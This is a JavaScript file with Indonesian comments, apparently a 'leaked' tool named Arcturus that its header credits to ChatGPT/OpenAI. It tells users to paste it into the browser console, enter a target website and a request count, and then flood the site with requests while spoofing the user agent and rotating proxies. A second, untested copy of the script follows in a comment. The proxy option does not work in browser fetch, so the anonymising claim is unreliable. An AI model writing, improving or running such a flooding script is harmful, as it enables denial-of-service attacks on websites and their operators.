// Welcome To Arcturus Project!
// Arcturus By: Axxet
// Created By: ChatGPT/OpenAi
// Leaked By: @AxxetLah (telegram)
// Reason: Gabut
// Cara pemakaian: Copy Script js ini -> Open Website Target -> Inspect -> Pilih network -> Paste Script js ini di console -> Enter dan tunggu sampai request selesai!
// Daftar proxy yang akan digunakan
const proxies = [
    "Your Proxy Here"
];

function getRandomProxy() {
  // Pilih salah satu proxy secara acak
  const randomIndex = Math.floor(Math.random() * proxies.length);
  return proxies[randomIndex];
}

function refreshWebsite(targetUrl, refreshCount) {
  const originalUserAgent = navigator.userAgent;

  for (let i = 0; i < refreshCount; i++) {
    // Ambil/Pilih proxy secara acak untuk merequest
    const proxy = getRandomProxy();

    // Spoof user agent
    navigator.__defineGetter__('userAgent', function() {
      return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36';
    });

    // Set proxy di dalam fetch
    const requestOptions = {
      method: 'GET',
      headers: {
        'User-Agent': navigator.userAgent,
      },
      mode: 'cors',
      credentials: 'omit',
      cache: 'no-store',
    };

    // Refresh website ama proxy yang diambil dengan acak
    fetch(targetUrl, { ...requestOptions, agent: `http://${proxy}` })
      .then(response => {
        // Balikin user agent ke nilai asli kalau udah selesai refresh
        navigator.__defineGetter__('userAgent', function() {
          return originalUserAgent;
        });

        // Respone, kalo gk perlu apus aja, kalo perlu ywdh gk ush di apus
        console.log(`Refresh ${i + 1} berhasil.`);
      })
      .catch(error => {
        console.error(`Refresh ${i + 1} gagal: ${error}`);
      });
  }
}

const targetUrlInput = prompt("Masukkan URL target website:");
const refreshCountInput = prompt("Masukkan jumlah  Request/Refresh:");

const targetUrl = targetUrlInput.trim();
const refreshCount = parseInt(refreshCountInput);

if (targetUrl && refreshCount && !isNaN(refreshCount)) {
  refreshWebsite(targetUrl, refreshCount);
} else {
  alert("Input tidak valid. Pastikan Anda mengisi URL target website dan jumlah refresh yang valid.");
}


/*
// Kalo Perlu Perlu aja, ini versi ke 2 nya ya
// Warning: Script ini belum di test, jadi kalau mau ente Test, silahkan saja
// Proxy yang bakal di pake (di format host:port)
const proxies = [
  "Your Proxy Here"
];

function getRandomProxy() {
  const randomIndex = Math.floor(Math.random() * proxies.length);
  return proxies[randomIndex];
}

function refreshWebsite(targetUrl, refreshCount) {
  const originalUserAgent = navigator.userAgent;

  for (let i = 0; i < refreshCount; i++) {
    const proxy = getRandomProxy();

    navigator.__defineGetter__('userAgent', function() {
      return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36';
    });

    // Parse host dan port dari proxy
    const [proxyHost, proxyPort] = proxy.split(':');

    const requestOptions = {
      method: 'GET',
      headers: {
        'User-Agent': navigator.userAgent,
      },
      mode: 'cors',
      credentials: 'omit',
      cache: 'no-store',
      // Gunakan host dan port proxy yang dipilih
      agent: `http://${proxyHost}:${proxyPort}`
    };

    fetch(targetUrl, requestOptions)
      .then(response => {
        // Kembalikan user agent ke nilai asli setelah selesai refreshing
        navigator.__defineGetter__('userAgent', function() {
          return originalUserAgent;
        });

        // Handle response jika perlu
        console.log(`Refresh ${i + 1} berhasil.`);
      })
      .catch(error => {
        console.error(`Refresh ${i + 1} gagal: ${error}`);
      });
  }
}

const targetUrlInput = prompt("Masukkan URL target website:");
const refreshCountInput = prompt("Masukkan jumlah kali refresh:");

const targetUrl = targetUrlInput.trim();
const refreshCount = parseInt(refreshCountInput);

if (targetUrl && refreshCount && !isNaN(refreshCount)) {
  refreshWebsite(targetUrl, refreshCount);
} else {
  alert("Input tidak valid. Pastikan Anda mengisi URL target website dan jumlah refresh yang valid.");
}

*/

// MAAF KALO JELEK, MASIH PEMULA